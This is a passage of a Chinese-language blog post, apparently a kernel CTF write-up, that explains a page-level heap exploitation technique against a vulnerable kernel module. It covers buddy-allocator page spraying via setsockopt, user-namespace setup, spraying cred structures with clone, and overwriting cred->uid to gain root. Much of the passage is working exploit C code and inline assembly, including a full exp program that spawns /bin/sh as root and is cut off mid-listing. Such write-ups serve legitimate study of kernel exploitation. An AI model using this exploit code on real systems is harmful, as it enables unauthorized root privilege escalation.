class="line"></span><br><span class="line">	pg_vec = kcalloc(block_nr, <span class="keyword">sizeof</span>(struct pgv), GFP_KERNEL | __GFP_NOWARN);</span><br><span class="line">	<span class="keyword">if</span> (unlikely(!pg_vec))</span><br><span class="line">		<span class="keyword">goto</span> out;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; block_nr; i++) &#123;</span><br><span class="line">		pg_vec[i].buffer = alloc_one_pg_vec_page(order);</span><br><span class="line">		<span class="keyword">if</span> (unlikely(!pg_vec[i].buffer))</span><br><span class="line">			<span class="keyword">goto</span> out_free_pgvec;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">out:</span><br><span class="line">	<span class="keyword">return</span> pg_vec;</span><br><span class="line"></span><br><span class="line">out_free_pgvec:</span><br><span class="line">	free_pg_vec(pg_vec, order, block_nr);</span><br><span class="line">	pg_vec = <span class="literal">NULL</span>;</span><br><span class="line">	<span class="keyword">goto</span> out;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>在 <code>alloc_one_pg_vec_page</code> 中会直接调用 <code>__get_free_pages</code> 向 buddy system 请求内存页，因此我们可以利用该函数进行大量的页面请求</li>
+</ul>
+<p>当我们耗尽 buddy system 中的 low order page 后，我们再请求的页面便都是物理连续的，因此此时我们再进行 <code>setsockopt</code> 便相当于获取到了一块近乎物理连续的内存：</p>
+<ul>
+<li>不能分配 low order page 时，程序就会从上一级的 free_area 中分配一个内存块</li>
+<li>然后等分为两个 low order page，这两个 low order page 就是物理连续的</li>
+<li>在 <code>setsockopt</code> 的流程中同样会分配大量我们不需要的结构体，从而消耗 buddy system 的部分页面，产生“噪声”</li>
+</ul>
+<p>具体的操作就是利用 <code>setsockopt</code> 申请大量的 1 page 内存块，部分 <code>setsockopt</code> 用于耗尽 low order page，而剩下的就有几率成为连续内存</p>
+<p><strong>入侵思路</strong></p>
+<p>其实入侵的思路很简单：就是通过这6字节的溢出来覆盖 cred 从而实现提权</p>
+<p>结构体 cred 所使用的 <code>kmem_cache</code> 是 <code>cred_jar</code></p>
+<ul>
+<li><code>cred</code> 的大小为 192</li>
+<li><code>cred_jar</code> 向 buddy system 单次请求 1 page 大小的内存块，足够分配21个 <code>cred</code></li>
+<li>利用系统调用 clone 可以申请新的 <code>cred</code>，从而耗尽 <code>cred_jar</code></li>
+</ul>
+<p>具体的利用思路如下：</p>
+<ul>
+<li>先分配大量的单张内存页，耗尽 buddy 中的 low order page</li>
+<li>间隔一张内存页释放掉部分单张内存页，之后堆喷 <code>cred</code>，这样便有几率获取到我们释放的单张内存页</li>
+<li>释放掉之前的间隔内存页，调用漏洞函数分配堆块，这样便有几率获取到我们释放的间隔内存页</li>
+<li>而间隔的两张内存页又有几率互为伙伴（物理地址连续）</li>
+<li>最后利用模块中漏洞进行越界写，篡改 <code>cred-&gt;uid</code> ，完成提权</li>
+</ul>
+<p>我们先利用 <code>setsockopt</code> 申请大量的 1 page 内存块，参考函数如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PACKET_VERSION 10</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PACKET_TX_RING 13</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">use_setsockopt_alloc_page</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tpacket_req</span> <span class="title">req</span> =</span> &#123;</span><br><span class="line">        .tp_block_size = <span class="number">0x1000</span>,</span><br><span class="line">        .tp_block_nr = <span class="number">1</span>,</span><br><span class="line">        .tp_frame_size = <span class="number">0x1000</span>,</span><br><span class="line">        .tp_frame_nr = <span class="number">1</span>,</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">int</span> socket_fd, version, ret;</span><br><span class="line"></span><br><span class="line">    socket_fd = socket(AF_PACKET, SOCK_RAW, PF_PACKET);</span><br><span class="line">    <span class="keyword">if</span> (socket_fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    ret = setsockopt(socket_fd, SOL_PACKET, PACKET_VERSION, &amp;version, <span class="keyword">sizeof</span>(version));</span><br><span class="line">    <span class="keyword">if</span>(ret &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        errPrint(<span class="string">&quot;setsockopt version error&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    ret = setsockopt(socket_fd, SOL_PACKET, PACKET_TX_RING, &amp;req, <span class="keyword">sizeof</span>(req));</span><br><span class="line">    <span class="keyword">if</span>(ret &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        errPrint(<span class="string">&quot;setsockopt req error&quot;</span>);</span><br><span class="line">    &#125;    </span><br><span class="line">    <span class="keyword">return</span> socket_fd;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>低权限用户无法使用上述函数，但是我们可以通过开辟新的命名空间来绕过该限制 </li>
+<li>这里需要注意的是我们提权的进程不应当和页喷射的进程在同一命名空间内，因为要在原本的命名空间完成提权 </li>
+<li>因此选择 fork 一个子进程，然后在子进程中开辟命名空间并完成页喷射（通过管道完成父子进程通信）</li>
+</ul>
+<p>开辟命令空间的函数如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">unshare_setup</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> edit[<span class="number">0x100</span>];</span><br><span class="line">    <span class="keyword">int</span> tmp_fd;</span><br><span class="line"></span><br><span class="line">    unshare(CLONE_NEWNS | CLONE_NEWUSER | CLONE_NEWNET);</span><br><span class="line"></span><br><span class="line">    tmp_fd = open(<span class="string">&quot;/proc/self/setgroups&quot;</span>, O_WRONLY);</span><br><span class="line">    write(tmp_fd, <span class="string">&quot;deny&quot;</span>, <span class="built_in">strlen</span>(<span class="string">&quot;deny&quot;</span>));</span><br><span class="line">    close(tmp_fd);</span><br><span class="line"></span><br><span class="line">    tmp_fd = open(<span class="string">&quot;/proc/self/uid_map&quot;</span>, O_WRONLY);</span><br><span class="line">    <span class="built_in">snprintf</span>(edit, <span class="keyword">sizeof</span>(edit), <span class="string">&quot;0 %d 1&quot;</span>, getuid());</span><br><span class="line">    write(tmp_fd, edit, <span class="built_in">strlen</span>(edit));</span><br><span class="line">    close(tmp_fd);</span><br><span class="line"></span><br><span class="line">    tmp_fd = open(<span class="string">&quot;/proc/self/gid_map&quot;</span>, O_WRONLY);</span><br><span class="line">    <span class="built_in">snprintf</span>(edit, <span class="keyword">sizeof</span>(edit), <span class="string">&quot;0 %d 1&quot;</span>, getgid());</span><br><span class="line">    write(tmp_fd, edit, <span class="built_in">strlen</span>(edit));</span><br><span class="line">    close(tmp_fd);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>使用系统调用 clone 来耗尽 <code>cred_jar</code> 的函数如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">__attribute__((naked)) <span class="function"><span class="keyword">long</span> <span class="title">simple_clone</span><span class="params">(<span class="keyword">int</span> flags, <span class="keyword">int</span> (*fn)(<span class="keyword">void</span> *))</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">/* clone(flags, stack, ...) */</span></span><br><span class="line">    <span class="function">__asm__ <span class="title">volatile</span> <span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">        <span class="string">&quot; mov r15, rsi; &quot;</span>   <span class="comment">/* save the rsi*/</span></span></span></span><br><span class="line"><span class="params"><span class="function">        <span class="string">&quot; xor rsi, rsi; &quot;</span>   <span class="comment">/* set esp and useless args to NULL */</span></span></span></span><br><span class="line"><span class="params"><span class="function">        <span class="string">&quot; xor rdx, rdx; &quot;</span></span></span></span><br><span class="line"><span class="params"><span class="function">        <span class="string">&quot; xor r10, r10; &quot;</span></span></span></span><br><span class="line"><span class="params"><span class="function">        <span class="string">&quot; xor r8, r8;   &quot;</span></span></span></span><br><span class="line"><span class="params"><span class="function">        <span class="string">&quot; xor r9, r9;   &quot;</span></span></span></span><br><span class="line"><span class="params"><span class="function">        <span class="string">&quot; mov rax, 56;  &quot;</span>   <span class="comment">/* __NR_clone */</span></span></span></span><br><span class="line"><span class="params"><span class="function">        <span class="string">&quot; syscall;      &quot;</span></span></span></span><br><span class="line"><span class="params"><span class="function">        <span class="string">&quot; cmp rax, 0;   &quot;</span></span></span></span><br><span class="line"><span class="params"><span class="function">        <span class="string">&quot; je child_fn;  &quot;</span></span></span></span><br><span class="line"><span class="params"><span class="function">        <span class="string">&quot; ret;          &quot;</span>   <span class="comment">/* parent */</span></span></span></span><br><span class="line"><span class="params"><span class="function">        <span class="string">&quot;child_fn:      &quot;</span></span></span></span><br><span class="line"><span class="params"><span class="function">        <span class="string">&quot; jmp r15;      &quot;</span>   <span class="comment">/* child */</span></span></span></span><br><span class="line"><span class="params"><span class="function">    )</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>本进程的 cred 我们是没有机会覆盖的，我们只能覆盖 clone 进程的 cred</li>
+<li>然后在主进程中触发溢出去覆盖 clone 进程的 cred，在 clone 进程里面尝试 get root</li>
+<li>clone 后的父进程 ret，子进程则跳转到函数指针 fn，并在该函数中等待 root 权限</li>
+</ul>
+<p>等待 root 权限的函数如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">waiting_for_root_fn</span><span class="params">(<span class="keyword">void</span> *args)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="function">__asm__ <span class="title">volatile</span> <span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">        <span class="string">&quot;   lea rax, [check_root_pipe]; &quot;</span></span></span></span><br><span class="line"><span class="params"><span class="function">        <span class="string">&quot;   xor rdi, rdi; &quot;</span></span></span></span><br><span class="line"><span class="params"><span class="function">        <span class="string">&quot;   mov edi, dword ptr [rax]; &quot;</span></span></span></span><br><span class="line"><span class="params"><span class="function">        <span class="string">&quot;   mov rsi, child_pipe_buf; &quot;</span></span></span></span><br><span class="line"><span class="params"><span class="function">        <span class="string">&quot;   mov rdx, 1;   &quot;</span></span></span></span><br><span class="line"><span class="params"><span class="function">        <span class="string">&quot;   xor rax, rax; &quot;</span> </span></span></span><br><span class="line"><span class="params"><span class="function">        <span class="string">&quot;   syscall;      &quot;</span> <span class="comment">/* read(check_root_pipe[0], child_pipe_buf, 1)*/</span></span></span></span><br><span class="line"><span class="params"><span class="function">        <span class="string">&quot;   mov rax, 102; &quot;</span> </span></span></span><br><span class="line"><span class="params"><span class="function">        <span class="string">&quot;   syscall; &quot;</span>      <span class="comment">/* getuid() */</span></span></span></span><br><span class="line"><span class="params"><span class="function">        <span class="string">&quot;   cmp rax, 0; &quot;</span></span></span></span><br><span class="line"><span class="params"><span class="function">        <span class="string">&quot;   jne failed; &quot;</span></span></span></span><br><span class="line"><span class="params"><span class="function">        <span class="string">&quot;   mov rdi, 1; &quot;</span></span></span></span><br><span class="line"><span class="params"><span class="function">        <span class="string">&quot;   lea rsi, [root_str]; &quot;</span></span></span></span><br><span class="line"><span class="params"><span class="function">        <span class="string">&quot;   mov rdx, 80; &quot;</span></span></span></span><br><span class="line"><span class="params"><span class="function">        <span class="string">&quot;   mov rax, 1;&quot;</span>    </span></span></span><br><span class="line"><span class="params"><span class="function">        <span class="string">&quot;   syscall; &quot;</span>      <span class="comment">/* write(1, root_str, 71) */</span></span></span></span><br><span class="line"><span class="params"><span class="function">        <span class="string">&quot;   lea rdi, [bin_sh_str];  &quot;</span></span></span></span><br><span class="line"><span class="params"><span class="function">        <span class="string">&quot;   lea rsi, [shell_args];  &quot;</span></span></span></span><br><span class="line"><span class="params"><span class="function">        <span class="string">&quot;   xor rdx, rdx; &quot;</span></span></span></span><br><span class="line"><span class="params"><span class="function">        <span class="string">&quot;   mov rax, 59;  &quot;</span></span></span></span><br><span class="line"><span class="params"><span class="function">        <span class="string">&quot;   syscall;      &quot;</span> <span class="comment">/* execve(&quot;/bin/sh&quot;, args, NULL) */</span></span></span></span><br><span class="line"><span class="params"><span class="function">        <span class="string">&quot;failed: &quot;</span></span></span></span><br><span class="line"><span class="params"><span class="function">        <span class="string">&quot;   lea rdi, [timer]; &quot;</span></span></span></span><br><span class="line"><span class="params"><span class="function">        <span class="string">&quot;   xor rsi, rsi; &quot;</span></span></span></span><br><span class="line"><span class="params"><span class="function">        <span class="string">&quot;   mov rax, 35; &quot;</span>  </span></span></span><br><span class="line"><span class="params"><span class="function">        <span class="string">&quot;   syscall; &quot;</span>      <span class="comment">/* nanosleep() */</span></span></span></span><br><span class="line"><span class="params"><span class="function">    )</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>最后组合一下就可以完成 exp 了</p>
+<p>完整 exp 如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdbool.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> KALLOC 0xcafebabe</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> KWRITE 0xf00dbabe</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PGV_PAGE_NUM 0x1000</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PACKET_VERSION 10</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PACKET_TX_RING 13</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">enum</span> &#123;</span></span><br><span class="line">    CMD_ALLOC_PAGE,</span><br><span class="line">    CMD_FREE_PAGE,</span><br><span class="line">    CMD_EXIT,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> fd;</span><br><span class="line"><span class="keyword">int</span> cmd_pipe_req[<span class="number">2</span>], cmd_pipe_reply[<span class="number">2</span>], check_root_pipe[<span class="number">2</span>];</span><br><span class="line"><span class="keyword">char</span> bin_sh_str[] = <span class="string">&quot;/bin/sh&quot;</span>;</span><br><span class="line"><span class="keyword">char</span> *shell_args[] = &#123; bin_sh_str, <span class="literal">NULL</span> &#125;;</span><br><span class="line"><span class="keyword">char</span> child_pipe_buf[<span class="number">1</span>];</span><br><span class="line"><span class="keyword">char</span> root_str[] = <span class="string">&quot;root&quot;</span>;</span><br><span class="line"><span class="keyword">int</span> socket_fd[PGV_PAGE_NUM];</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">timespec</span> <span class="title">timer</span> =</span> &#123;</span><br><span class="line">    .tv_sec = <span class="number">1145141919</span>,</span><br><span class="line">    .tv_nsec = <span class="number">0</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">castaway_request</span> &#123;</span></span><br><span class="line">    <span class="keyword">int64_t</span> index;</span><br><span class="line">    <span class="keyword">size_t</span>	size;</span><br><span class="line">    <span class="keyword">void</span> 	*buf;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page_request</span>&#123;</span></span><br><span class="line">    <span class="keyword">int</span> idx;</span><br><span class="line">    <span class="keyword">int</span> cmd;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tpacket_req</span> &#123;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> tp_block_size;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> tp_block_nr;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> tp_frame_size;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> tp_frame_nr;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">errPrint</span><span class="params">(<span class="keyword">char</span> *str)</span></span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(str);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">initFd</span><span class="params">(<span class="keyword">char</span> *str)</span></span>&#123;</span><br><span class="line">    fd = open(str,O_RDWR);</span><br><span class="line">    <span class="keyword">if</span>(fd &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        errPrint(<span class="string">&quot;open error&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">kalloc</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">castaway_request</span> <span class="title">r</span> =</span> &#123;</span><br><span class="line">        .index = <span class="number">0</span>,</span><br><span class="line">        .size = <span class="number">0</span>,</span><br><span class="line">        .buf = <span class="number">0</span>,</span><br><span class="line">    &#125;;</span><br><span class="line">    ioctl(fd,KALLOC,&amp;r);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">kwrite</span><span class="params">(<span class="keyword">int</span> index,<span class="keyword">int</span> size,<span class="keyword">char</span>* buf)</span></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">castaway_request</span> <span class="title">r</span> =</span> &#123;</span><br><span class="line">        .index = index,</span><br><span class="line">        .size = size,</span><br><span class="line">        .buf = buf,</span><br><span class="line">    &#125;;</span><br><span class="line">    ioctl(fd,KWRITE,&amp;r);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">__attribute__((naked)) <span class="function"><span class="keyword">long</span> <span class="title">simple_clone</span><span class="params">(<span class="keyword">int</span> flags, <span class="keyword">int</span> (*fn)(<span class="keyword">void</span> *))</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">/* clone(flags, stack, ...) */</span></span><br><span class="line">    <span class="function">__asm__ <span class="title">volatile</span> <span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">        <span class="string">&quot; mov r15, rsi; &quot;</span>   <span class="comment">/* save the rsi*/</span></span></span></span><br><span class="line"><span class="params"><span class="function">        <span class="string">&quot; xor rsi, rsi; &quot;</span>   <span class="comment">/* set esp and useless args to NULL */</span></span></span></span><br><span class="line"><span class="params"><span class="function">        <span class="string">&quot; xor rdx, rdx; &quot;</span></span></span></span><br><span class="line"><span class="params"><span class="function">        <span class="string">&quot; xor r10, r10; &quot;</span></span></span></span><br><span class="line"><span class="params"><span class="function">        <span class="string">&quot; xor r8, r8;   &quot;</span></span></span></span><br><span class="line"><span class="params"><span class="function">        <span class="string">&quot; xor r9, r9;   &quot;</span></span></span></span><br><span class="line"><span class="params"><span class="function">        <span class="string">&quot; mov rax, 56;  &quot;</span>   <span class="comment">/* __NR_clone */</span></span></span></span><br><span class="line"><span class="params"><span class="function">        <span class="string">&quot; syscall;      &quot;</span></span></span></span><br><span class="line"><span class="params"><span class="function">        <span class="string">&quot; cmp rax, 0;   &quot;</span></span></span></span><br><span class="line"><span class="params"><span class="function">        <span class="string">&quot; je child_fn;  &quot;</span></span></span></span><br><span class="line"><span class="params"><span class="function">        <span class="string">&quot; ret;          &quot;</span>   <span class="comment">/* parent */</span></span></span></span><br><span class="line"><span class="params"><span class="function">        <span class="string">&quot;child_fn:      &quot;</span></span></span></span><br><span class="line"><span class="params"><span class="function">        <span class="string">&quot; jmp r15;      &quot;</span>   <span class="comment">/* child */</span></span></span></span><br><span class="line"><span class="params"><span class="function">    )</span></span>;</span><br><span 